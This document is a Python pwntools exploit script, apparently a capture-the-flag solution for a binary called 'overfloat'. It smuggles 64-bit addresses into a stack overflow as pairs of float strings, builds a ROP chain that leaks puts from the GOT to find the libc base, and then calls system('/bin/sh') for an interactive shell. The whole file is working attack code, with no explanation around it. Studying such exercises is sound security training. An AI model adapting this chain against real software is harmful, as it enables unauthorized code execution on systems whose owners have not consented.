from pwn import *
import struct

gdbcmds = '''
b *main+119
b *chart_course+317
c
'''

elf = context.binary = ELF("./overfloat")
libc = elf.libc
#target = gdb.debug('./overfloat', gdbscript=gdbcmds)
target = process("./overfloat")


def generate_float_strings(address: int) -> (bytes, bytes):
    high = (address >> 32) & 0xFFFFFFFF
    low  = address & 0xFFFFFFFF
    
    float1 = struct.unpack('!f', struct.pack('!I', high))[0]
    float2 = struct.unpack('!f', struct.pack('!I', low))[0]
    
    def float_to_str(f):
        if f.is_integer():
            return str(int(f))
        else:
            return repr(f)

    s1 = float_to_str(float2).encode('ascii')
    s2 = float_to_str(float1).encode('ascii')
    
    return s1, s2
    
def send_address(address):

    s1, s2 = generate_float_strings(address)
    target.recvuntil(b":")
    target.sendline(s1)
    target.recvuntil(b":")
    target.sendline(s2)

for i in range(7):
    send_address(0x9090909090909090)

send_address(0x0000000000400a83) # pop rdi; ret
send_address(0x0000000000602020)  # puts got
send_address(0x0000000000400690) # puts plt
send_address(0x0000000000400993) # main
target.sendline(b"done") 

target.recvuntil(b"!")
target.recvline()
puts_leak = target.recvline().strip()
puts_leak = puts_leak+b"\x00"*(8-len(puts_leak))
puts_leak = u64(puts_leak)
print("Libc leak:", hex(puts_leak))

libc.address = puts_leak - libc.sym.puts
for i in range(7):
    send_address(0x9090909090909090)

send_address(0x0000000000400661) # ret
send_address(0x0000000000400a83) # pop rdi; ret
send_address(next(libc.search(b"/bin/sh")))
send_address(libc.sym.system)
target.sendline(b"done") 

target.interactive()
